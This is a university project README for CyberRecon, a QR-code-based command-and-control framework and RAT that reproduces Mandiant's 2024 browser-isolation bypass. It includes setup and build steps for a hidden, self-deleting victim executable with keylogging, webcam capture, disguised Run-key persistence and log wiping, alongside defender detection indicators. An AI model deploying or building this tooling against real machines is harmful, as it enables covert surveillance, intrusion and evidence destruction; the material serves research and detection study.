> ⚠️ **EDUCATIONAL SECURITY RESEARCH ONLY**
>
> This project reproduces a technique published by Mandiant (2024) for
> academic study. It is intended **solely for isolated lab environments**
> with explicit authorization. Unauthorized use is illegal. See
> [ETHICS.md](ETHICS.md) for full terms and published detection
> signatures.

[![CI — Security & Tests](https://github.com/Jeevan1725/cyberrecon/actions/workflows/ci.yml/badge.svg)](https://github.com/Jeevan1725/cyberrecon/actions/workflows/ci.yml)

# CyberRecon: QR Code-Based C2 Framework

Reproduction & defensive study of Mandiant's 2024 QR-C2 browser-isolation bypass.

**Status:** Demo-ready · 100+ commits · 10 CWEs remediated · SAST clean · v3.5 hardened.

---

## Team

- **Vekeshhari Rajasekar** (CH.SC.U4CYS23051)
- **R Jeevan** (CH.SC.U4CYS23036)
- **Guide:** Dr. S. Udhayakumar
- **Institution:** Amrita School of Computing, Amrita Vishwa Vidyapeetham, Chennai

---

## Overview

CyberRecon is a self-contained QR-Code-based Command & Control (C2) framework that demonstrates how visually rendered QR codes can pass through browser-isolation filters as pixel data.

Unlike Mandiant's 2024 proof-of-concept (which requires the paid Cobalt Strike framework), CyberRecon is fully self-contained, open-source, and reproduces the technique end-to-end.

---

## Key Results

| Metric | Value |
|--------|-------|
| **Throughput** | 400–500 bytes/sec (Mandiant baseline: ~438) |
| **QR decode latency** | ~650ms (Mandiant baseline: ~5s per frame) |
| **RAT features** | 12 (screenshot, webcam, keylogger, clipboard, GPS, process list, system info, file ops, persistence, self-destruct, shell, list files) |
| **Security patches** | 6 CWEs fixed (306, 295, 78, 22, 330, 798) + 4 CWEs (311, 384, 613, 539) + 5 hardening layers (v3.5) |
| **SAST findings** | 0 HIGH, 0 CVEs, 0 Semgrep, 0 Ruff |
| **Runtime dependencies** | 13 (down from 20+) |
| **Merged PRs** | 27 |

---

## Architecture

```
┌───────────────┐    ┌───────────────┐    ┌───────────────┐
│ Operator CLI  │───▶│  C2 Server    │───▶│  QR Channel   │
│ + Dashboard   │◀───│  (Flask)      │    │  (visual)     │
└───────────────┘    └───────┬───────┘    └───────┬───────┘
       ▲                     │                    │
       │ session+token       ▼                    ▼
       │             ┌───────────────┐    ┌───────────────┐
       └─────────────│  AWS Relay    │    │ Victim Client │
                     │  (optional)   │    │ (Python RAT)  │
                     └───────────────┘    └───────┬───────┘
                                                  │
                                                  ▼
                                          ┌───────────────┐
                                          │  Exfil (HTTPS)│
                                          │  X-Victim-Key │
                                          └───────────────┘
```

Full diagrams: [`docs/diagrams/`](docs/diagrams/) — use case, sequence, architecture, deployment, data flow, attack tree, self-destruct (PlantUML + rendered PNG).

---

## Features

### C2 Server (Flask)

- QR-encoded base64-JSON command channel (Level-H error correction)
- **AES-256-GCM encryption** of QR payloads (`CYBERRECON_KEY`)
- **Dashboard login** (session cookie, HttpOnly, Secure, SameSite=Lax)
- **Operator token authentication** (`X-Operator-Token` header)
- **Victim shared-key authentication** (`X-Victim-Key` header / `?vkey=` query)
- **Rate limiting** on `/register` (5/min per IP) + victim cap (100)
- Live dashboard with real-time polling
- Per-victim exfil storage and bulk ZIP download
- **`/self_destruct_notify`** — purge victim record on self-destruct
- Health check endpoint (`/check`)

### Victim Client (RAT)

- Selenium + headless Chrome QR fetch (faithful to Mandiant technique)
- OpenCV QR decode
- 12 features (inlined in `rat_client.py`)
- Graceful fallback to `requests.get` if Chrome unavailable
- Camera/microphone permission auto-grant for isolated-browser environments
- **Filesystem sandbox** (`CYBERRECON_SANDBOX`) for all file operations
- **Anti-forensic self-destruct** — wipes registry, temp, RunMRU, RecentDocs, sandbox, and payload itself
- **Embedded config** — single-file `.exe` build with no external `.env`

### Operator CLI

- Password login → session cookie
- Operator token on command-issuing endpoints
- Interactive shell: `victims`, `select <id>`, `<command>`, `info`, `help`, `exit`
- TLS verification with optional CA bundle for self-signed lab certs

### Multi-Layer Fallback

TCP → HTTP → QR (visual channel is the reliable path).

### Optional Components

- **AWS Relay** (`aws_relay.py`) — traffic relay + domain fronting
- **AI Agent** (`ai_agent.py`) — natural-language command parsing

---

## Security Hardening (v3.5)

Five defense-in-depth layers were added on top of the original operator-token auth and sandbox model:

1. **AES-256-GCM QR payload encryption** — commands are encrypted before QR encoding; the client decrypts with a pre-shared key (`CYBERRECON_KEY`). Passive QR interception now reveals ciphertext only.

2. **Victim shared-key authentication** — every victim-side call sends `X-Victim-Key` (header) or `?vkey=` (query fallback for headless Chrome navigation). Server rejects unauthenticated registrations and exfil.

3. **Dashboard login** — operator must log in with `CYBERRECON_DASHBOARD_PASSWORD` before accessing `/dashboard` or any read-only API (`/victims`, `/victim/<id>`, `/exfil-data/<id>`, `/latest_screenshot/<id>`, `/latest_webcam/<id>`). Session cookie is `HttpOnly`, `Secure`, `SameSite=Lax`, expiring after `CYBERRECON_SESSION_HOURS`.

4. **Filesystem sandbox** — every file operation (`file_download`, `list_files`) validates the requested path against `CYBERRECON_SANDBOX` using `os.path.realpath` + `os.path.commonpath`. Paths outside the sandbox are rejected.

5. **Anti-forensic self-destruct** — on operator command, the implant:
   - Deletes `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsSecurityUpdate`
   - Deletes `HKCU\Software\CyberRecon` and related registry trees
   - Clears `RunMRU` and `RecentDocs` entries matching CyberRecon markers
   - Deletes temp scripts, Chrome profile directories, and sandbox contents
   - Notifies the server to purge its victim record (`/self_destruct_notify`)
   - Schedules deletion of the payload binary (`.exe` or `.py`) via a detached `cmd.exe`
   - Optional: attempts elevated cleanup of Prefetch and event logs (`CYBERRECON_ELEVATED_WIPE=1`)

### New Environment Variables (v3.5)

| Variable | Purpose |
|----------|---------|
| `CYBERRECON_KEY` | AES-256-GCM key for QR payloads (44-char base64url) |
| `CYBERRECON_VICTIM_KEY` | Shared victim-side authentication key |
| `CYBERRECON_DASHBOARD_PASSWORD` | Dashboard login password |
| `CYBERRECON_SECRET_KEY` | Flask session signing key (64-char urlsafe) |
| `CYBERRECON_SESSION_HOURS` | Session lifetime (default 8) |
| `CYBERRECON_SANDBOX` | Filesystem sandbox root (empty = `~/CyberReconSandbox`) |
| `CYBERRECON_SELF_DELETE` | Delete payload after launch, opt-in (0/1) |
| `CYBERRECON_ELEVATED_WIPE` | Attempt admin cleanup on self-destruct (0/1) |
| `CYBERRECON_REMOVE_DECOY` | Delete decoy PDF on self-destruct (0/1) |
| `CYBERRECON_INTERVAL` | Client poll interval in seconds (default 3) |
| `CYBERRECON_ALLOW_SELFSIGNED` | Accept self-signed TLS cert (0/1) |

### Key Generation

```bash
# AES-256-GCM key (44 chars)
python -c "import os,base64; print(base64.urlsafe_b64encode(os.urandom(32)).decode())"

# Operator token
python -c "import secrets; print(secrets.token_urlsafe(32))"

# Victim key
python -c "import secrets; print(secrets.token_urlsafe(32))"

# Dashboard password
python -c "import secrets,string; a=string.ascii_letters+string.digits; print(''.join(secrets.choice(a) for _ in range(24)))"

# Session signing key
python -c "import secrets; print(secrets.token_urlsafe(48))"
```

Paste the outputs into `.env`. The victim client must use the **same** `CYBERRECON_KEY` and `CYBERRECON_VICTIM_KEY`.

---

## Why Selenium (and Chrome)?

Mandiant's 2024 QR-C2 technique relies on a **real browser rendering the QR image as pixels**. That pixel stream is what bypasses browser-isolation products — they cannot strip what the user sees.

A plain `requests.get()` only downloads a PNG; it does **not** reproduce the technique. Our client uses **Selenium + headless Chrome** to:

- Reproduce the actual browser rendering pipeline (pixel channel)
- Provide a real Chrome fingerprint (defeats headless-bot detection)
- Auto-grant camera/microphone permissions (some RBI products block dynamic media access before the QR renders)

**Client prerequisite:** Google Chrome must be installed on the victim host. The client falls back to direct `requests`-based fetch if Chrome is unavailable or cannot reach the C2 — functionality preserved, stealth reduced.

**Docker:** the provided `Dockerfile` installs Chrome automatically.

---

## Installation

```bash
git clone https://github.com/Jeevan1725/cyberrecon.git
cd cyberrecon

python -m venv venv
source venv/bin/activate     # Windows: .\venv\Scripts\activate
pip install -r requirements.txt
```

### System dependencies (QR decoding)

- **Ubuntu/Debian:** `sudo apt install libzbar0`
- **macOS:** `brew install zbar`
- **Windows:** included in the `opencv-python` wheel

### TLS certificate (for HTTPS mode)

The server auto-detects `cert.pem` + `key.pem` in the working directory. Generate self-signed certs with Python (no OpenSSL install needed):

```bash
python -c "from cryptography.hazmat.primitives.asymmetric import rsa; from cryptography.hazmat.primitives import serialization, hashes; from cryptography import x509; from cryptography.x509.oid import NameOID; import datetime; k=rsa.generate_private_key(public_exponent=65537,key_size=4096); sub=x509.Name([x509.NameAttribute(NameOID.COMMON_NAME,u'cyberrecon.local')]); now=datetime.datetime.utcnow(); cert=x509.CertificateBuilder().subject_name(sub).issuer_name(sub).public_key(k.public_key()).serial_number(x509.random_serial_number()).not_valid_before(now).not_valid_after(now+datetime.timedelta(days=365)).sign(k,hashes.SHA256()); open('key.pem','wb').write(k.private_bytes(serialization.Encoding.PEM,serialization.PrivateFormat.TraditionalOpenSSL,serialization.NoEncryption())); open('cert.pem','wb').write(cert.public_bytes(serialization.Encoding.PEM)); print('cert.pem and key.pem generated')"
```

Set `CYBERRECON_ALLOW_SELFSIGNED=true` on the client to accept the self-signed cert.

---

## Quick Start

### Option A — Docker (Recommended)

```bash
# Set an operator token (REQUIRED — the server needs this for auth)
export CYBERRECON_OPERATOR_TOKEN="$(python -c 'import secrets; print(secrets.token_hex(24))')"
export CYBERRECON_DASHBOARD_PASSWORD="$(python -c 'import secrets,string; a=string.ascii_letters+string.digits; print(\"\".join(secrets.choice(a) for _ in range(24)))')"
export CYBERRECON_KEY="$(python -c 'import os,base64; print(base64.urlsafe_b64encode(os.urandom(32)).decode())')"
export CYBERRECON_VICTIM_KEY="$(python -c 'import secrets; print(secrets.token_urlsafe(32))')"
export CYBERRECON_SECRET_KEY="$(python -c 'import secrets; print(secrets.token_urlsafe(48))')"

echo "Operator token:   $CYBERRECON_OPERATOR_TOKEN"
echo "Dashboard pass:   $CYBERRECON_DASHBOARD_PASSWORD"
echo "AES key:          $CYBERRECON_KEY"
echo "Victim key:       $CYBERRECON_VICTIM_KEY"

# Build and start
docker compose up --build -d

# Verify
docker compose ps
# → cyberrecon-c2  Up (healthy)  0.0.0.0:8443->8443/tcp

# Access
# Login:        http://localhost:8443/login
# Dashboard:    http://localhost:8443/dashboard
# Health check: http://localhost:8443/check
```

**Security hardening applied by Docker Compose:**

- Read-only root filesystem
- `tmpfs` for writable paths (`/tmp`, `/app/reports`)
- Linux capabilities dropped (`cap_drop: ALL`)
- `no-new-privileges:true`
- Non-root user (UID 1000)
- CPU (1.0 core) and memory (1 GB) limits
- Healthcheck every 30s
- Log rotation (10 MB × 3)

### Option B — Local Python

```bash
# Terminal 1 — C2 server
export CYBERRECON_OPERATOR_TOKEN="demo-token-12345"
export CYBERRECON_KEY="$(python -c 'import os,base64; print(base64.urlsafe_b64encode(os.urandom(32)).decode())')"
export CYBERRECON_VICTIM_KEY="$(python -c 'import secrets; print(secrets.token_urlsafe(32))')"
export CYBERRECON_DASHBOARD_PASSWORD="demo-dashboard-pass"
export CYBERRECON_SECRET_KEY="$(python -c 'import secrets; print(secrets.token_urlsafe(48))')"
python c2_server.py

# Terminal 2 — Operator CLI (prompts for password)
export CYBERRECON_OPERATOR_TOKEN="demo-token-12345"
python operator_cli.py --c2 https://127.0.0.1:8443

# Terminal 3 — Victim client (in isolated lab VM)
export CYBERRECON_C2="https://<SERVER_LAN_IP>:8443"
export CYBERRECON_KEY="<same-key-as-server>"
export CYBERRECON_VICTIM_KEY="<same-key-as-server>"
export CYBERRECON_ALLOW_SELFSIGNED=true
python rat_client.py --auto-register --interval 3

# Browser — Login then dashboard
open https://127.0.0.1:8443/dashboard
# → redirects to /login → enter CYBERRECON_DASHBOARD_PASSWORD
```

### Two-Machine Demo (LAN)

Run the server on machine A, client on machine B (same network).

**On machine A (server) `.env`:**
```
CYBERRECON_C2=https://<SERVER_LAN_IP>:8443
```

**On machine B (victim) `.env` or `EMBEDDED_CONFIG` in `rat_client.py`:**
```
CYBERRECON_C2=https://<SERVER_LAN_IP>:8443
CYBERRECON_KEY=<same-as-server>
CYBERRECON_VICTIM_KEY=<same-as-server>
CYBERRECON_ALLOW_SELFSIGNED=true
```

**Firewall rule on machine A (elevated PowerShell):**
```powershell
New-NetFirewallRule -DisplayName "CyberRecon C2 8443" -Direction Inbound -Protocol TCP -LocalPort 8443 -Action Allow -Profile Any
```

**Verify from machine B:**
```powershell
Test-NetConnection <SERVER_LAN_IP> -Port 8443
# TcpTestSucceeded : True
curl.exe -k https://<SERVER_LAN_IP>:8443/
# {"status":"CyberRecon C2 Server Active",...}
```

---

## Environment Variables

| Variable | Default | Purpose |
|----------|---------|---------|
| `CYBERRECON_OPERATOR_TOKEN` | (required) | Auth token for `/command`, `/shell`, `/download-all` |
| `CYBERRECON_DASHBOARD_PASSWORD` | (required) | Dashboard login password |
| `CYBERRECON_SECRET_KEY` | (auto) | Flask session signing key — stable across restarts |
| `CYBERRECON_SESSION_HOURS` | `8` | Session cookie lifetime |
| `CYBERRECON_REQUIRE_AUTH` | `true` | Toggle operator-token enforcement (fail-closed) |
| `CYBERRECON_REQUIRE_VICTIM_KEY` | `true` | Toggle victim-key enforcement (fail-closed) |
| `CYBERRECON_KEY` | (required for AES) | AES-256-GCM key for QR payloads (44-char base64url) |
| `CYBERRECON_VICTIM_KEY` | (required) | Shared victim-side authentication key |
| `CYBERRECON_C2` | `https://127.0.0.1:8443` | C2 URL used by client |
| `CYBERRECON_ALLOW_SELFSIGNED` | `false` | Accept self-signed TLS certificate |
| `CYBERRECON_SANDBOX` | `~/CyberReconSandbox` | Filesystem sandbox root |
| `CYBERRECON_SELF_DELETE` | `0` | Delete payload after launch (0/1) |
| `CYBERRECON_ELEVATED_WIPE` | `0` | Attempt admin cleanup on self-destruct (0/1) |
| `CYBERRECON_REMOVE_DECOY` | `0` | Delete decoy PDF on self-destruct (0/1) |
| `CYBERRECON_INTERVAL` | `3` | Client poll interval in seconds |
| `CYBERRECON_CA_BUNDLE` | (optional) | Custom CA bundle for TLS verification |
| `C2_HOST` | `0.0.0.0` | C2 bind address |
| `C2_PORT` | `8443` | C2 bind port |

Copy `.env.example` to `.env` and edit.

---

## File Structure

```
cyberrecon/
├── c2_server.py             # Flask C2 + QR encoder + dashboard + login
├── rat_client.py            # Victim client (12 features + anti-forensics)
├── operator_cli.py          # Operator console (session login + token)
├── aws_relay.py             # Optional traffic relay
├── main.py                  # Unified launcher
├── config.py                # Global configuration
├── ai_agent.py              # NL command parser
├── tests/                   # Pytest suite
├── docs/
│   ├── report/              # 8 documents + evidence (v3.5 changelog added)
│   ├── diagrams/            # 9 PlantUML diagrams (self-destruct sequence + trust boundaries)
│   └── adr/                 # Architecture Decision Records
├── reports/                 # v3.0 SAST evidence + README note
├── Dockerfile               # Multi-stage hardened build
├── docker-compose.yml       # Hardened Compose (fail-closed on missing secrets)
├── bandit.yaml              # Bandit SAST rules
├── pyproject.toml           # Ruff + pytest config
├── requirements.txt         # 13 runtime deps
└── requirements-dev.txt     # + pytest, bandit, pip-audit, pyinstaller, ruff
```

---

## Documentation

| Document | Purpose |
|----------|---------|
| [docs/report/03-requirements.md](docs/report/03-requirements.md) | Software Requirements Specification |
| [docs/report/04-architecture.md](docs/report/04-architecture.md) | Component architecture + data flow |
| [docs/report/06-threat-model.md](docs/report/06-threat-model.md) | STRIDE analysis + MITRE ATT&CK mapping |
| [docs/report/07-security-features.md](docs/report/07-security-features.md) | Security controls + remediated anti-patterns |
| [docs/report/08-security-testing.md](docs/report/08-security-testing.md) | Bandit, Semgrep, pip-audit, Ruff results (v3.5 addendum included) |
| [docs/report/09-dependency-analysis.md](docs/report/09-dependency-analysis.md) | Module fan-in/fan-out + reduction (20+ → 13) |
| [docs/report/10-hardening-changelog.md](docs/report/10-hardening-changelog.md) | v3.5 hardening changes + residual artifacts |
| [docs/diagrams/](docs/diagrams/) | 9 PlantUML diagrams (rendered PNGs + trust boundaries) |
| [ETHICS.md](ETHICS.md) | Ethical terms + published IOCs for defenders |

---

## Security

### Implemented Controls

- **Authentication:** Operator token auth on `/command`, `/shell`, `/download-all`; victim shared-key auth on all victim-side routes; dashboard session login for read-only APIs; fail-closed on misconfiguration
- **Encryption:** AES-256-GCM QR payload encryption (per-message nonce, base64url encoding)
- **Transport:** HTTPS with self-signed cert support; session cookies `HttpOnly` + `Secure` + `SameSite=Lax`
- **Input validation:** `shell=False` subprocess; shell-metacharacter blocklist; path-traversal validation via `realpath` + `commonpath`; sandbox enforcement
- **Cryptographic randomness:** CSPRNG victim/command IDs (`secrets.token_hex`); per-request nonces for AES-GCM
- **Anti-forensics:** Registry cleanup (Run key, RunMRU, RecentDocs, app keys), temp file sweep, Chrome profile removal, sandbox wipe, payload self-delete
- **Supply chain:** Dependabot + 7-day cooldown; secret scanning; push protection
- **Runtime isolation:** Non-root Docker user; read-only root FS; capability drop; `no-new-privileges`
- **Software integrity:** Branch protection; required status checks; audit trail
- **Static analysis:** Bandit + Semgrep + pip-audit + Ruff on every push/PR

### Remediated CWEs

| CWE | Description | Fix |
|-----|-------------|-----|
| CWE-306 | Missing auth on critical endpoints | `@require_operator_token`, `@require_victim_key`, `@require_dashboard_login` decorators |
| CWE-295 | Improper certificate validation | Enforce TLS verify; `CYBERRECON_CA_BUNDLE`; opt-in `ALLOW_SELFSIGNED` |
| CWE-78 | OS command injection (`shell=True`) | `shlex.split` + `shell=False` + metacharacter blocklist |
| CWE-22 | Path traversal in launcher | `realpath` validation + sandbox enforcement |
| CWE-330 | Insufficient random values | CSPRNG via `secrets.token_hex` / `secrets.token_bytes` |
| CWE-798 | Hardcoded credentials | Env vars + CSPRNG fallback + `.env` gitignored |
| CWE-311 (v3.5) | Missing encryption of sensitive data (QR payloads) | AES-256-GCM encryption |
| CWE-384 (v3.5) | Session fixation | `session.clear()` before login, `session.permanent = True` |
| CWE-613 (v3.5) | Insufficient session expiration | `PERMANENT_SESSION_LIFETIME` configurable |
| CWE-539 (v3.5) | Persistent cookies | `HttpOnly`, `Secure`, `SameSite=Lax` |

### SAST Results

| Tool | Before | After (v3.0) | After (v3.5) |
|------|--------|--------------|--------------|
| Bandit | 25 (4 HIGH) | 17 (0 HIGH) | 0 HIGH (CI green) |
| Semgrep | 5 | 0 | 0 (CI green) |
| pip-audit | 0 CVEs | 0 CVEs | 0 CVEs |
| Ruff | 131 | 0 | 0 (CI green) |

Full evidence: [docs/report/08-security-testing.md](docs/report/08-security-testing.md)

---

## CI/CD

### CI — Security & Tests (`.github/workflows/ci.yml`)

Runs on every push to `main` and every PR:

1. **Security Scan** — Bandit (SAST) + pip-audit (SCA) + Ruff (lint)
2. **Unit Tests** — pytest with coverage

Report artifacts uploaded per run.

### CD — Release Deploy (`.github/workflows/cd.yml`)

Triggers on `v*` tags or manual dispatch:

1. Run tests
2. Run Bandit
3. Build Docker image
4. Create GitHub Release with tarball + SAST report

### Branch Protection

The `main` branch is protected by a ruleset requiring:

- Pull request + 1 approval
- Required status checks: `Security Scan` + `Unit Tests`
- No force pushes; no deletions
- Admin bypass with audit trail

---

## Testing

```bash
# Full test suite
pytest tests/ -v

# With coverage
pytest tests/ -v --cov=. --cov-report=html

# SAST
bandit -r . -c bandit.yaml
semgrep --config=p/python --config=p/owasp-top-ten .
pip-audit -r requirements.txt
ruff check .
```

---

## Building the EXE (Optional)

Fill `EMBEDDED_CONFIG` in `rat_client.py` with your server's details before building — the `.exe` will not need a `.env` file.

```bash
pip install pyinstaller

pyinstaller --onefile --noconsole --name CyberReconClient \
    --hidden-import=pynput.keyboard._win32 \
    --hidden-import=pynput.mouse._win32 \
    --collect-all selenium \
    --collect-all cv2 \
    --collect-all cryptography \
    --collect-all qrcode \
    rat_client.py
```

Output: `dist/CyberReconClient.exe` (~94 MB).

When launched with no arguments, the `.exe` auto-registers and begins polling. Set `CYBERRECON_SELF_DELETE=1` in `EMBEDDED_CONFIG` to enable post-launch self-deletion and decoy drop.

---

## Threat Model & Defensive Value

The technique reproduces Mandiant's 2024 QR-C2 (T1071.001, T1132.001, T1090.004, etc.) plus standard RAT behaviors (T1113, T1125, T1056.001, T1115).

Defenders should look for:

- **Network:** Repeated POST to `/exfil/*` (beaconing), non-standard ports, HTTPS with self-signed certs
- **Host:** Registry Run key `WindowsSecurityUpdate`, `WindowsUpdateTask` scheduled task, `wevtutil cl` invocations, detached `cmd.exe` spawning batch files in `%TEMP%`
- **Application:** Chrome `--headless=new` + `--use-fake-ui-for-media-stream`, OpenCV loads in Python process, Selenium WebDriver `scoped_dir*` profiles in `%TEMP%`
- **Data:** Large base64 POSTs, clipboard reads without user action, webcam access without user action
- **Auth layer:** Repeated failed POSTs to `/login`, suspicious session cookie traffic, victim key replay attempts

Full detection guidance + attack tree: [docs/report/06-threat-model.md](docs/report/06-threat-model.md) and [docs/diagrams/attack-tree.md](docs/diagrams/attack-tree.md)

---

## License

See [LICENSE](LICENSE) — MIT with research clause.

---

## References

1. Mandiant (2024) — "(QR) Coding My Way Out of Here: C2 in Browser Isolation Environments"
2. Agarwal et al. (2022) — "Spook.js: Attacking Chrome Strict Site Isolation via Speculative Execution" (IEEE S&P)
3. Koptyra & Ogiela (2024) — "Information Hiding in QR Codes using Segment Manipulation" (IEEE PerCom)
4. Jin et al. (2022) — "Timing-Based Browsing Privacy Vulnerabilities Via Site Isolation" (IEEE S&P)

---

## Acknowledgments

- Amrita School of Computing, Chennai Campus
- Department of CSE — Cyber Security
- Guide: Dr. S. Udhayakumar